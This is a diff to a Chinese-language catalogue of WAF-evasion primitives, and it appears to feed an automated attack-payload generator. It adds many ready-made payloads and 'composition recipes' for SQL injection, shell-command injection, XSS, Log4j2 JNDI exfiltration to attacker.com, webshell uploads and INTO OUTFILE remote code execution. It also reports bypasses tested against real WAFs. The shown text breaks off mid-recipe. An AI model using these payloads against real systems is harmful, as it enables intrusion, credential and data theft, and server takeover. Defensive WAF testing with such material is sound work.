@@ -12,23 +12,24 @@
 
 | 场景 | 层 | 原语 |
 |------|----|------|
-| sqli | lexical | comment_split / version_comment / whitespace_sub / quote_split / case_flip / double_write / wide_byte |
-| sqli | syntactic | operator_swap / ident_zero / null_replacement / function_backtick / query_restructure / hpp |
-| sqli | semantic | gtid_subset / math_zero / prepared_stmt / sys_schema |
+| sqli | lexical | comment_split / version_comment / whitespace_sub / quote_split / case_flip / double_write / wide_byte / **space_word_split / paren_whitespace / and_or_suffix_chars** |
+| sqli | syntactic | operator_swap / ident_zero / null_replacement / function_backtick / query_restructure / hpp / **null_safe_equal / false_expr / greatest_bound / from_for_no_comma / case_when_if / bitwise_cmp** |
+| sqli | semantic | gtid_subset / math_zero / prepared_stmt / sys_schema / **regexp_predicate / second_order** |
 | cmdi | lexical | quote_split / backslash / ifs / ansi_c_quoting |
-| cmdi | syntactic | glob / brace_expansion / parameter_expansion / logical_chain |
+| cmdi | syntactic | glob / brace_expansion / parameter_expansion / logical_chain / **shell_alias / arith_expansion / rev_command / case_tr / here_string_feed / redir_read_alt** |
 | cmdi | semantic | env_concat / oob |
-| xss | context | tag_bypass / attr_event / js_string / url_proto / dom_sink / rawtext_escape / form_vectors / base_href / embed_object / srcdoc / meta_refresh / css_injection / import_map / svg_xlink / math_mtext / event_more |
+| xss | context | tag_bypass / attr_event / js_string / url_proto / dom_sink / rawtext_escape / form_vectors / base_href / embed_object / srcdoc / meta_refresh / css_injection / import_map / svg_xlink / math_mtext / event_more / **scrollsnapchanging / template_literal_js / details_ontoggle / svg_xlink_data_script** |
 | xss | mutation | mxss_noscript / mxss_svg / mxss_template / mxss_mathml / mxss_flatten / mxss_comment / mxss_attr_closer |
-| xss | obfuscation | js_func_obfuscation / comment_slice / from_charcode / indirect_exec / regex_source / tagged_template / unicode_escape_id / entity_attr / fullwidth_nfkc / keyword_assemble |
-| xss | semantic | dom_clobber / polyglot / parser_differential / detection_rotation |
+| xss | obfuscation | js_func_obfuscation / comment_slice / from_charcode / indirect_exec / regex_source / tagged_template / unicode_escape_id / entity_attr / fullwidth_nfkc / keyword_assemble / **atob_innerhtml** |
+| xss | semantic | dom_clobber / polyglot / parser_differential / detection_rotation / **json_unicode_mismatch / mismatch_context** |
 | xss | protocol | hpp_pollution |
-| log4j2 | lookup | lower_upper / empty_default / env_default / date_lookup / non_exist_lookup / ip_bracket / hash_fragment / unicode_lookup |
+| log4j2 | lookup | lower_upper / empty_default / env_default / date_lookup / non_exist_lookup / ip_bracket / hash_fragment / unicode_lookup / **env_nested_exfil / bundle_env_key / port_whitelist / url_space_after** |
 | log4j2 | protocol | header_injection / nested_recursion |
-| upload | extension | multi_extension / double_extension / case_ext / trailing_dot |
+| upload | extension | multi_extension / double_extension / case_ext / trailing_dot / **nullbyte_truncate** |
 | upload | config | htaccess / user_ini |
-| upload | content | short_tag / dynamic_function / magic_bytes |
+| upload | content | short_tag / dynamic_function / magic_bytes / **case_short_tag / webshell_split / svg_xxe** |
 | upload | filename | filename_star / crlf_filename |
+| upload | multipart | **duplicate_disposition / filename_star_conflict / malformed_boundary** |
 | protocol | transfer | chunked / hpp_params / path_normalization / control_chars |
 
 ---
@@ -950,3 +951,481 @@
 
 ### upload:race:* / secondorder:*
 - **模板**: Tomcat CVE-2024-50379 并发 PUT/GET、`.user.ini` 二次上传、日志投毒 + include、`<%=Runtime.getRuntime().exec(...)%>`（JSPX）
+
+---
+
+## 2026-08 第二轮扩充（联网检索）
+
+> 来自 4 路联网检索（2026-08），聚焦 2024-2025 新技法与语义引擎盲区。
+> 部分含真实绕过证据：CRS PL3 sandbox 实测 200（`uni on sel ect`、shell 别名）、
+> 阿里云 WAF 1462 条内置规则全绕（通配符）、两层过滤绕过（`scrollsnapchanging`）。
+
+### sqli:lexical:space_word_split — 关键字音节间插空格
+- **原理**: `uni on sel ect` 在 `union select` 各音节间插空格。WAF 的 `union[\w\s]*?select` 类正则要求关键字成块；MySQL 词法跨空白合并为 `UNION SELECT`。CRS PL3 sandbox 实测返回 200（coreruleset issue #4191）。
+- **风险**: 仅对"关键字成块匹配"规则有效；语义引擎若先做词法归一化则失效。
+- **模板**: `uni on sel ect 1,2,3,4,5`、`se lec t * fro m users`
+- **组合**: 与大小写、version_comment 叠加。
+
+### sqli:lexical:paren_whitespace — 括号替代空白
+- **原理**: MySQL 允许 `UNION(SELECT(1)FROM(dual))` 用括号完全替代关键字间空白——WAF 的空白分隔正则失配。
+- **风险**: 需后端 MySQL；语义引擎可解析嵌套括号。
+- **模板**: `UNION(SELECT(1)FROM(dual))`、`(SELECT(username)FROM(users))`
+- **组合**: 与 whitespace_sub 叠加。
+
+### sqli:lexical:and_or_suffix_chars — AND/OR 后直接跟符号
+- **原理**: MySQL 词法允许 AND/OR 后直接跟 `+ - ~ ! @` 而无需空白（`1 AND-1=-1`、`1 OR+1=1`、`1 AND!0`），WAF 的 `and\s+` 空白锚定正则失配。
+- **风险**: 需后端 MySQL；符号集有限。
+- **模板**: `id=1 AND-1=-1`、`id=1 OR+1=1`、`1 AND!0`
+- **组合**: 与 operator_swap、ident_zero 叠加。
+
+### sqli:syntactic:null_safe_equal — 空安全等值
+- **原理**: `=` 用 MySQL `<=>`（null-safe equal）替代——语义等价但绕过 `=` 黑名单与字面匹配。
+- **风险**: `<=>` 与 `<=` 相邻时注意词法切分。
+- **模板**: `id<=>1`、`WHERE 1<=>1`
+- **组合**: 与 synonym:= 同义轮换使用。
+
+### sqli:syntactic:false_expr — 函数/算术制造假值
+- **原理**: `AND 1=0`/`AND 0` 高度被拦；改用函数制造假值：`char(0)`、`mod(29,9)`、`point(29,9)`、`nullif(1337,1337)`、算术 `1*0`/`1-1`/`0/1`，配合 `&`/`&&`/`|`/`||` 逻辑。
+- **风险**: 部分函数需特定参数类型，按后端实测。
+- **模板**: `id=1 && point(29,9)`、`AND nullif(1337,1337)`、`AND mod(29,9)`
+- **组合**: 与 operator_swap、synonym:= 叠加。
+
+### sqli:syntactic:greatest_bound — GREATEST 替代比较
+- **原理**: 盲注 `<`/`>` 被拦时用 `greatest(ascii(mid(user(),1,1)),150)=150` 表达"≥150"——GREATEST 取最大恒等于右值即大于等于，避开比较运算符。
+- **风险**: 仅盲注场景；每字符多次请求。
+- **模板**: `greatest(ascii(mid(user(),1,1)),150)=150`
+- **组合**: 与 from_for_no_comma 叠加（免逗号+免比较）。
+
+### sqli:syntactic:from_for_no_comma — FROM..FOR 免逗号
+- **原理**: 逗号被拦时用 `mid(user() from 1 for 1)` / `substr(user() from 1 for 1)` 替代 `mid(user(),1,1)`——消除逗号字符。
+- **风险**: 仅 MySQL 的 FROM..FOR 语法。
+- **模板**: `substr(user() from 1 for 1)`、`mid(version() from 5 for 3)`
+- **组合**: 与 greatest_bound 叠加以完全免比较/免逗号。
+
+### sqli:syntactic:case_when_if — CASE WHEN 替代 IF
+- **原理**: `IF()` 被拦时用 `CASE WHEN (cond) THEN 1 ELSE 0 END` 表达条件逻辑——标准 SQL 关键字，WAF 规则少盯。
+- **风险**: 冗长但语义引擎难判恶意。
+- **模板**: `AND CASE WHEN (1=1) THEN 1 ELSE 0 END`
+- **组合**: 与盲注探测叠加。
+
+### sqli:syntactic:bitwise_cmp — 位运算比较
+- **原理**: MySQL 支持 `<<` `>>` `&` `^` 位运算；`id=1<<0` 恒等于 `id=1`、`7&5`=5——替代 `=` 与数字黑名单。
+- **风险**: 结果需精确可预测。
+- **模板**: `id=1<<0`、`AND 7&5`、`id=(1<<1)-1`
+- **组合**: 与 false_expr 叠加。
+
+### sqli:semantic:regexp_predicate — REGEXP 谓词
+- **原理**: MySQL `REGEXP`/`RLIKE` 做布尔判断：`id=1 REGEXP '^1'`——绕过 `=`/`LIKE` 监控。同义词 `=` 已 confirmed 有效，REGEXP 是下一层变体。
+- **风险**: 仅 MySQL；性能略低。
+- **模板**: `id=1 REGEXP '^1'`、`1 RLIKE '1'`
+- **组合**: 与 synonym:= / synonym:LIKE 轮换。
+
+### sqli:semantic:second_order — 二阶注入
+- **原理**: 恶意 payload 存库后由另一请求触发执行——WAF 通常只检首条入口流量，看不到第二次触发上下文。
+- **风险**: 需应用存在存储→拼接链路；单请求无法验证。
+- **模板**: 注册 `admin' AND 1=1--` → 登录/查询时触发
+- **组合**: 与任何原语叠加（存入的是变形 payload）。
+
+### cmdi:syntactic:shell_alias — 内置别名绕过
+- **原理**: Bash/Zsh 默认别名 `la`/`ll`（=`ls -a`/`ls -l`）不在规则集内，`;la /var/www` 返回目录列表——2025 实测绕过 CRS PL3（coreruleset issue #4390）。
+- **风险**: 需 shell 加载 alias（交互式才有）。
+- **模板**: `;la /etc`、`;ll /var/www`
+- **组合**: 与 logical_chain 叠加。
+
+### cmdi:syntactic:arith_expansion — 算术进制构造字符
+- **原理**: `$((16#74))` 把十六进制 74 转为十进制 116（'t'），`/bin/ca$((16#74))` 拼出 `cat`——命令名不含 c-a-t 字面。
+- **风险**: bash 专有（dash 不支持 `$((16#..))`）。
+- **模板**: `/bin/ca$((16#74))`、`echo $((16#6f))`
+- **组合**: 与 quote_split、backslash 叠加。
+
+### cmdi:syntactic:rev_command — 反转执行
+- **原理**: `$(rev<<<'imaohw')` 反转 `whoami` 后在子 shell 执行——payload 不含目标命令名字面串。
+- **风险**: 依赖 `rev` 存在；需 `<<<`（bash/zsh）。
+- **模板**: `$(rev<<<'imaohw')`、`echo $(rev<<<'tac')`
+- **组合**: 与 case_tr 叠加。
+
+### cmdi:syntactic:case_tr — 大小写转换后执行
+- **原理**: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` 用 tr 转小写后执行——Linux 大小写敏感，直接 `WhOaMi` 无效但转换后可行。
+- **风险**: 需 tr 可用；空格需替换（`%09`/`${IFS}`）。
+- **模板**: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
+- **组合**: 与 ifs_sub、arith_expansion 叠加。
+
+### cmdi:syntactic:here_string_feed — here-string 喂命令
+- **原理**: `bash<<<$(base64 -d<<<...)` 把解码结果经 here-string 喂给 bash——不出现命令字面与管道符。
+- **风险**: 依赖 bash；base64 关键字本身可能被拦。
+- **模板**: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)`
+- **组合**: 与编码维度（未来 skill）叠加。
+
+### cmdi:syntactic:redir_read_alt — 输入重定向读文件
+- **原理**: `grep root < /etc/passwd` 用 `<` 输入重定向替代 `cat file | grep`——避开管道符与 `cat` 关键字。
+- **风险**: 需文件可读；`<` 可能被规则盯。
+- **模板**: `grep root < /etc/passwd`、`head < /etc/passwd`
+- **组合**: 与 glob 组合读任意路径。
+
+### xss:context:scrollsnapchanging — 新型 scroll 事件
+- **原理**: `scrollsnapchanging` 是较新 scroll-snap 事件，规则集未收录——2024 实测绕过两层独立 XSS 过滤（gabriel.urdhr.fr），配合 atob 两阶段解码；用 fragment 锚点可自动触发，无需用户交互。
+- **风险**: Firefox 不支持；需 scroll-snap 容器样式。
+- **模板**: `<div style="...scroll-snap-type:y" data-x="innerHTML" data-y="<base64>" onscrollsnapchanging="this[this.dataset.x]=atob(this.dataset.y)">`
+- **组合**: 与 atob_innerhtml 是经典配套。
+
+### xss:context:template_literal_js — 模板字面量注入
+- **原理**: JS 上下文中 `` `${alert(1)}` `` 模板字面量直接执行表达式——过滤 script/事件关键字时用反引号模板绕过。
+- **风险**: 注入点需在 JS 表达式/模板串内。
+- **模板**: `` `${alert(1)}` ``、`` `<img src=x onerror=alert(1)>` ``
+- **组合**: 与 js_string 上下文逃逸叠加。
+
+### xss:context:details_ontoggle — details 切换事件
+- **原理**: `<details open ontoggle=alert(1)>` 用 details 的 toggle 事件 + open 属性自动触发——无需交互，事件名冷门。
+- **风险**: 需 `open` 属性使事件自动触发。
+- **模板**: `<details open ontoggle=alert(1)>`
+- **组合**: 与 tag_case、handler_split 叠加。
+
+### xss:context:svg_xlink_data_script — SVG xlink data 脚本
+- **原理**: `<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>` 用 xlink:href + data: URI 加载脚本——2024 真实绕过案例（客户端正则过滤），WAF 规则多只盯 `<script src=`.
+- **风险**: 需支持 xlink 的浏览器上下文。
+- **模板**: `<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>`
+- **组合**: 与 svg_xlink 现有原语互补。
+
+### xss:semantic:json_unicode_mismatch — JSON 净化→HTML 渲染
+- **原理**: payload 经 JSON 净化保留 `<` 等 Unicode 转义，微服务解码后渲染进 HTML 视图时转义失效——净化器上下文不感知（2025 趋势）。
+- **风险**: 需 JSON→HTML 的跨上下文链路。
+- **模板**: `{"msg":"<script>alert(1)</script>"}`
+- **组合**: 与任意上下文原语叠加（存库的是转义形态）。
+
+### xss:semantic:mismatch_context — 跨上下文净化失效
+- **原理**: 数据按 A 上下文（如 DB）净化、却在 B 上下文（日志面板/预览）原样渲染——sanitizer 上下文不感知是语义引擎盲区（QQ 预览 mXSS 同族）。
+- **风险**: 依赖应用上下文流转；单请求难验证。
+- **模板**: DB 存 `<img src=x onerror=alert(1)>` → 日志面板渲染
+- **组合**: 与 mXSS 原语族互补。
+
+### xss:obfuscation:atob_innerhtml — 两阶段 data-attr 注入
+- **原理**: 用 `data-x` 存目标名、`data-y` 存 base64 载荷，事件处理器里 `this[this.dataset.x]=atob(this.dataset.y)` 解码写 innerHTML——首阶段不出现危险关键字。
+- **风险**: 需事件处理器可用；两阶段都需通过过滤。
+- **模板**: `<div data-x="innerHTML" data-y="<base64>" onmouseover="this[this.dataset.x]=atob(this.dataset.y)">`
+- **组合**: 与 scrollsnapchanging 经典配套。
+
+### log4j2:lookup:env_nested_exfil — 嵌套外带环境变量
+- **原理**: `${jndi:dns://${env:HOST}.attacker.com/}` 内层 `${env:...}` 先解析、拼进外层 lookup——一次请求外带主机名/密钥。WAF 只拦外层 jndi 时漏掉。
+- **风险**: 需 DNS 外带通道可达。
+- **模板**: `${jndi:dns://${env:HOST}.attacker.com/}`、`${jndi:ldap://${sys:user.name}.attacker/}`
+- **组合**: 与 lower/::- 混淆叠加。
+
+### log4j2:lookup:bundle_env_key — bundle+env 组合读键
+- **原理**: `${${a:-b}undle:${env:FLAG}}` 用 `${a:-b}` 拆出 bundle 关键字、内层 env 指定键名——GoogleCTF 2022 同款；WAF 拦字面 bundle/jndi 时漏组合式。
+- **风险**: 需应用反射 malformed lookup key。
+- **模板**: `${${a:-b}undle:${env:FLAG}}`、`${bundle:${env:KEY}}`
+- **组合**: 与已实测通过的 bundle:application 同族。
+
+### log4j2:lookup:port_whitelist — 白名单端口出站
+- **原理**: 出站常只放行 80/443/8080/8443，用这些端口搭监听可绕过端口限制。
+- **风险**: 需控制白名单端口上的服务。
+- **模板**: `${jndi:ldap://attacker.example.com:8080/x}`、`:8443`
+- **组合**: 与 proto:* 冷门协议叠加。
+
+### log4j2:lookup:url_space_after — URL 尾随空格
+- **原理**: `${jndi:ldap://127.0.0.1:9999/ test}` 在 URL 后加空格——绕过 2.15.0-rc1 的关键字校验修复。
+- **风险**: 依赖解析器容忍尾随空格。
+- **模板**: `${jndi:ldap://127.0.0.1:1389/ test}`
+- **组合**: 与 lower_upper 混淆叠加。
+
+### upload:ext:nullbyte_truncate — 空字节截断
+- **原理**: `xxx.php[\0].JPG` 空字节在 C 系/老 PHP 后端截断文件名，扩展名落在 `.php`——WAF 看到 `.JPG`，后端存 `.php`。
+- **风险**: PHP ≥5.3.4 已修复；需老版本或特殊处理。
+- **模板**: `shell.php%00.jpg`、`x.php\0.png`
+- **组合**: 与 double_extension 叠加。
+
+### upload:content:case_short_tag — 大小写短标签
+- **原理**: `<?PHP` 大小写变体绕过"只拦小写 <?php"的内容扫描——PHP 标签大小写不敏感（Codegate 2024 实测）。
+- **风险**: 需 content 扫描为子串匹配。
+- **模板**: `<?PHP system($_GET['c']); ?>`
+- **组合**: 与 magic_bytes 叠加。
+
+### upload:content:webshell_split — 关键字拆分混淆
+- **原理**: `'sys'.'tem'` 字符串拼接、`strrev('metsys')`、`base64_decode`+`eval` 绕过 webshell 关键字扫描——文件内容不含 `system(` 字面。
+- **风险**: 需 eval 可用（老 PHP 常见）。
+- **模板**: `$f='sys'.'tem';$f($_GET['c']);`、`$f=strrev('metsys');$f($_GET['c']);`
+- **组合**: 与 content:dynamic-func 族叠加。
+
+### upload:multipart:duplicate_disposition — 重复 Content-Disposition
+- **原理**: 同一 part 重复 `Content-Disposition` 头——FortiWeb 解析第二个、PHP 解析第一个（或反），WAF 看到安全名、PHP 用危险扩展名。
+- **风险**: 依赖具体 WAF/后端解析器组合。
+- **模板**: 第一个 `filename="safe.txt"`、第二个 `filename="shell.php"`
+- **组合**: 与 filename_star_conflict 叠加。
+
+### upload:multipart:filename_star_conflict — filename 双参混淆
+- **原理**: Go 的 multipart 解析器偏爱 `filename*`，PHP 偏爱 `filename`；同时发送两参，WAF 看到安全名、后端用危险名（Codegate 2024 "Cha's Wall"）。
+- **风险**: 依赖前后端解析器偏好差异。
+- **模板**: `filename="foo.jpg"; filename*=utf-8''shell.php`
+- **组合**: 与 duplicate_disposition 叠加。
+
+### upload:multipart:malformed_boundary — 畸形 multipart 边界
+- **原理**: 破坏 `\r\n` 序列或省略结尾 boundary——PHP 宽容解析，WAF 拒绝/漏检。
+- **风险**: 依赖解析器宽容度差异。
+- **模板**: 缺结尾 `--boundary--`、混合 `\r`/`\n` 行尾
+- **组合**: 与 duplicate_disposition 叠加。
+
+### upload:content:svg_xxe — SVG 内嵌攻击
+- **原理**: 上传 SVG 可同时打存储型 XSS 与 XXE：`<svg onload=...>`、`<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`——WAF 不解析 XML 内容则漏。
+- **风险**: 需应用渲染/解析 SVG。
+- **模板**: `<svg xmlns=... onload="alert(1)"></svg>`、SVG 内嵌 DOCTYPE XXE
+- **组合**: 与 xss:context 原语族互通。
+
+---
+
+## 组合配方（composition recipes）
+
+> **定位**：原子原语是弹药，这里是**成建制攻击**。每条配方是"目标明确 + 多层原语栈 + 完整攻击 payload"。
+> Layer-1 生成时应**从配方出发**（改结构、换组合、套上下文），而不是从单技法变换出发。
+> 配方里的 `flag`/`flags` 是攻击目标占位符（本地 lab 敏感表），远程实测时保留该语义代表"读取敏感数据"。
+> 配方以 sqli 为主（当前主战场），cmdi/xss 各附数条示范跨场景移植。
+
+### recipe:sqli_table_stmt — MySQL8 TABLE 直接读表
+- **原语栈**: `sqli:syntactic:query_restructure` × `sqli:semantic:prepared_stmt`（新语法）
+- **payload**: `-1 UNION TABLE flags LIMIT 1,2`
+- **机制**: MySQL 8.0.19+ 的 `TABLE flags` 完全等价 `SELECT * FROM flags`——但 WAF 规则几乎只盯 `SELECT`/`UNION SELECT`，不认 `TABLE` 是攻击。语义引擎解析后才知道是查表。
+- **变体**: `TABLE flags`、`TABLE flags ORDER BY 1`、`VALUES ROW(1,(TABLE flags),3)`（嵌套）
+- **适用**: 后端 MySQL ≥8.0.19；联合列数对齐。
+
+### recipe:sqli_layer_matrix — 版本注释×引号拆分×空白×注释 四层矩阵
+- **原语栈**: `sqli:lexical:version_comment` × `sqli:lexical:quote_split` × `sqli:lexical:whitespace_sub` × `sqli:lexical:comment_split`
+- **payload**: `1 /*!50000UNI''ON*/%0aSEL/**/ECT%0a1,(SELECT/**/flag/**/FROM/**/flags/**/LIMIT/**/1),3-- -`
+- **机制**: 每层各攻一个检测面——版本注释骗"注释剥除"、`UNI''ON` 拆连续匹配、`%0a` 用非 `%20` 空白、`SEL/**/ECT` 打断关键字。WAF 四个角度都看到"碎片"，MySQL 全还原成 `UNION SELECT`。
+- **变体**: 任一层可替换（双写代引号拆分、`%0b` 代 `%0a`、`/*!00000*/` 代版本号）。
+
+### recipe:sqli_join_derived_read — 无列名 JOIN 派生 + 读真实数据
+- **原语栈**: `sqli:syntactic:query_restructure`（join_derived）× `sqli:lexical:comment_split`
+- **payload**: `-1/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/1)a/**/JOIN/**/(SELECT/**/flag/**/FROM/**/flags/**/LIMIT/**/1)b/**/JOIN/**/(SELECT/**/3)c-- -`
+- **机制**: 不写列名，用派生表 JOIN 构造 3 列（1, flag, 3）——WAF 的 `SELECT flag` 或 `SELECT 1,2,3` 模式都不命中；`/**/` 全注释拆散关键字。
+- **变体**: 列数按目标调整（加 JOIN 段）；注释换 `%0a`。
+
+### recipe:sqli_extractvalue_error — 报错注入回显 flag
+- **原语栈**: `sqli:semantic:gtid_subset`（报错族）× `sqli:lexical:comment_split`
+- **payload**: `1/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/flag/**/FROM/**/flags/**/LIMIT/**/1)))-- -`
+- **机制**: `EXTRACTVALUE` 第二个参数必须是合法 XPath，`CONCAT(0x7e,flag)` 使 XPath 非法 → MySQL 把整个参数回显进错误信息——flag 直接出现在响应里。`0x7e`=`~` 作分隔符。
+- **变体**: `UPDATEXML(1,CONCAT(0x7e,(SELECT flag FROM flags)),1)`、GTID_SUBSET 报错。
+
+### recipe:sqli_prep_hex — 预处理语句 + HEX 构造 SQL
+- **原语栈**: `sqli:semantic:prepared_stmt` × `sqli:syntactic:string_hex_literal`
+- **payload**: `1';SET/**/@a=0x73656c65637420666c61672066726f6d20666c616773;PREPARE/**/s/**/FROM/**/@a;EXECUTE/**/s;-- -`
+- **机制**: 恶意语句以 hex 字面量存在变量里，`PREPARE s FROM @a` 再执行——整个 `SELECT flag FROM flags` 不以明文出现，WAF 字面匹配全部落空。hex=`select flag from flags`。
+- **风险**: 需堆叠查询（stacked queries）支持。
+- **变体**: `SET @a=CONCAT(0x73656c656374,0x20,...)` 分片构造。
+
+### recipe:sqli_regexp_blind — REGEXP 谓词 + hex 目标盲注
+- **原语栈**: `sqli:semantic:regexp_predicate` × `sqli:lexical:comment_split` × `sqli:syntactic:string_hex_literal`
+- **payload**: `1/**/AND/**/(SELECT/**/flag/**/FROM/**/flags/**/LIMIT/**/1)/**/REGEXP/**/0x5e666c6167`
+- **机制**: 子查询取 flag，`REGEXP 0x5e666c6167`（=`'^flag'`）做布尔判断——无 `=`、无引号、无 `LIKE`，三类监控全绕过；hex 字符串再藏一层。
+- **变体**: 逐字符 `REGEXP 0x5e2e2e2e` 前缀爆破；`RLIKE` 同义。
+- **风险**: 盲注逐字符慢，但每请求都是完整绕过。
+
+### recipe:sqli_greatest_blind — GREATEST + FROM..FOR 免比较免逗号
+- **原语栈**: `sqli:syntactic:greatest_bound` × `sqli:syntactic:from_for_no_comma` × `sqli:lexical:comment_split`
+- **payload**: `1/**/AND/**/greatest(ascii(mid((SELECT/**/flag/**/FROM/**/flags/**/LIMIT/**/1)/**/from/**/1/**/for/**/1)),150)=150`
+- **机制**: `greatest(a,150)=150` 表达 `a>=150`——无 `<`/`>`；`mid(... from 1 for 1)` 无逗号。比较类规则和逗号规则同时失效。
+- **变体**: 阈值二分；`substr` 替代 `mid`。
+
+### recipe:sqli_case_bitwise — CASE WHEN × 位运算盲注
+- **原语栈**: `sqli:syntactic:case_when_if` × `sqli:syntactic:bitwise_cmp` × `sqli:lexical:comment_split`
+- **payload**: `1/**/AND/**/CASE/**/WHEN/**/((SELECT/**/1/**/FROM/**/flags/**/LIMIT/**/1)<<0)/**/THEN/**/1/**/ELSE/**/0/**/END`
+- **机制**: `CASE WHEN` 替代 `IF()`，`(子查询)<<0` 替代 `=1`——条件逻辑用不常见关键字表达，WAF 规则少盯。
+- **变体**: 探测值换 `(SELECT/**/flag/**/.../**/)<<0` 配合 REGEXP 前缀。
+
+### recipe:sqli_paren_nullsafe — 括号代空白 × 空安全等值
+- **原语栈**: `sqli:lexical:paren_whitespace` × `sqli:syntactic:null_safe_equal` × `sqli:lexical:comment_split`
+- **payload**: `1/**/AND/**/(SELECT/**/1/**/FROM/**/flags/**/LIMIT/**/1)<=>1`
+- **机制**: 子查询存在性用 `<=>`（null-safe equal）判断，`=1` 与 `1=1` 都不出现；括号与注释替代空白。
+- **变体**: 配合 GREATEST 做数值盲注。
+
+### recipe:sqli_outfile_rce — UNION 写文件 RCE
+- **原语栈**: `sqli:semantic:into_outfile` × `sqli:syntactic:union_select`
+- **payload**: `1/**/UNION/**/SELECT/**/0x3c3f7068702073797374656d28245f4745545b315d293b3f3e/**/INTO/**/OUTFILE/**/0x2f7661722f7777772f68746d6c2f732e706870-- -`
+- **机制**: `INTO OUTFILE` 把 hex 编码的 PHP 一句话写进 web 根目录——payload 不含 `<?php` 明文（0x3c3f706870...）；写文件路径也 hex 化。后续 `GET /s.php?1=cmd` 即 RCE。
+- **风险**: 需要 FILE 权限 + 写目录可写。
+- **变体**: DUMPFILE 写单个 webshell；`SELECT ... INTO DUMPFILE` 无引号 hex 版。
+
+### recipe:sqli_space_word_full — 音节拆分完整攻击
+- **原语栈**: `sqli:lexical:space_word_split` × `sqli:lexical:comment_split`
+- **payload**: `1 uni on sel ect 1,(sel ect flag fro m flags),3-- -`
+- **机制**: 每个关键字音节间插空格，`fro m` 拆 `from`——CRS PL3 实测 200 的手法放大成完整读表查询（原语只测了列计数，这里做成真攻击）。
+- **变体**: 音节拆分 × `SEL/**/ECT` 混用，双保险。
+
+### recipe:cmdi_glob_redir_read — 通配符 × 输入重定向读文件
+- **原语栈**: `cmdi:syntactic:glob` × `cmdi:syntactic:redir_read_alt`
+- **payload**: `;/??b/cat </e??/pass??` 或 `;/???/c?t </etc/passwd`
+- **机制**: 命令与文件全通配——`cat` 无字面、`/etc/passwd` 无字面、无管道；`<` 重定向替代 `cat x | ...`。阿里云 1462 规则全绕同类手法。
+- **变体**: `grep` 变体 `/??n/g?e?` 组合。
+
+### recipe:cmdi_herestring_base64 — here-string × base64 整段执行
+- **原语栈**: `cmdi:syntactic:here_string_feed` × 编码维度（占位）
+- **payload**: `;bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
+- **机制**: base64 里含完整命令+管道，`bash<<<$(...)` 解码后喂给 bash——明文里只有 `bash`/`base64` 两个安全词。
+- **变体**: `xxd -r -p` 替代 base64；`openssl base64 -d` 兜底。
+
+### recipe:xss_svg_xlink_data_full — SVG xlink data 完整攻击
+- **原语栈**: `xss:context:svg_xlink_data_script` × `xss:context:svg_xlink`
+- **payload**: `<svg><script xlink:href="data:text/javascript,alert(document.domain)"></script></svg>`
+- **机制**: xlink:href 从 data: URI 加载 JS，绕 `<script src=>` 与直接脚本体规则；SVG 容器触发。
+- **变体**: `<svg onload=...>` 换 `xlink:href`；data URI 再 base64。
+
+### recipe:xss_scrollsnap_atob — 两阶段事件注入完整攻击
+- **原语栈**: `xss:context:scrollsnapchanging` × `xss:obfuscation:atob_innerhtml`
+- **payload**: `<div style="scroll-snap-type:y;overflow-y:scroll;height:200px" data-x="innerHTML" data-y="PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+" onscrollsnapchanging="this[this.dataset.x]=atob(this.dataset.y)"></div>#auto`
+- **机制**: 首阶段只含 data-* 属性与冷门事件（无危险关键字），事件触发后 `atob` 解码第二阶段写 innerHTML；`#auto` 锚点自动滚动触发，无需交互。
+- **风险**: Firefox 不支持 scrollsnapchanging；需 scroll-snap 容器。
+- **变体**: `onmouseover`/`onclick` 换触发；第二阶段换 `onerror` img。
+- **⚠️ 实测修正（2026-08）**: 事件名**不能用 `/**/` 拆分**（JS 注释不能用于 HTML 属性名，`on/**/error` 不触发）。已本地验证：未拆分版机制成立（atob→innerHTML→img onerror 触发），但远程 WAF 对未拆分版**全拦**——本 WAF 的 XSS 检测无漏洞，该配方作边界参考。
+
+### recipe:upload_gif_webshell — GIF 魔数 + 拼接函数图片马
+- **原语栈**: `upload:content:magic_bytes` × `upload:content:webshell_split`
+- **payload**: `GIF89a<?php $f='sy'.'stem';$f($_GET[1]);?>`
+- **机制**: GIF89a 头骗过 getimagesize/exif_imagetype 图片校验；`'sy'.'stem'` 拼接函数名绕过 `system(` 关键字扫描；双层隐藏。
+- **风险**: 需 PHP + 可写上传目录；eval 类需允许。
+- **变体**: JPEG/PNG 魔数、`strrev('metsys')`、base64_decode。
+
+### recipe:upload_htaccess_rce — .htaccess 配置型 RCE
+- **原语栈**: `upload:config:htaccess`
+- **payload**: `.htaccess` 内容 `AddType application/x-httpd-php .jpg`
+- **机制**: 声明任意扩展按 PHP 解析，随后传图片马即 RCE；WAF 只看扩展名时漏配置型攻击。
+- **风险**: 需 Apache + AllowOverride；.htaccess 本身要被允许上传。
+- **变体**: `SetHandler application/x-httpd-php`、`.user.ini auto_prepend_file`。
+
+### recipe:upload_userini_poly — .user.ini + 图片马
+- **原语栈**: `upload:content:user_ini_prepend` × `upload:content:magic_bytes`
+- **payload**: `.user.ini` = `auto_prepend_file=2.png`；`2.png` = `GIF89a<?php ...?>`
+- **机制**: PHP-FPM 场景 .user.ini 比 .htaccess 通用，auto_prepend_file 使每个请求预载图片马；配置 + 内容双绕过。
+- **风险**: 需 PHP-FPM；两个文件都要上传成功。
+- **变体**: `.user.ini` 换 `auto_append_file`。
+
+### recipe:upload_filename_diff — filename 双参解析器差异
+- **原语栈**: `upload:multipart:filename_star_conflict` × `upload:multipart:duplicate_disposition`
+- **payload**: 首 `Content-Disposition` `filename="safe.txt"`、次 `filename*=utf-8''shell.php`
+- **机制**: Go 偏 `filename*`、PHP 偏 `filename`，双参让 WAF 看安全名后端用危险扩展名；重复 disposition 头同理（FortiWeb/PHP 解析差异）。
+- **风险**: 依赖具体 WAF/后端解析器组合。
+- **变体**: 换 disposition 头顺序、`filename="a.jpg;filename=b.php"`。
+
+### recipe:upload_svg_stored — SVG 存储型攻击
+- **原语栈**: `upload:content:svg_xxe`
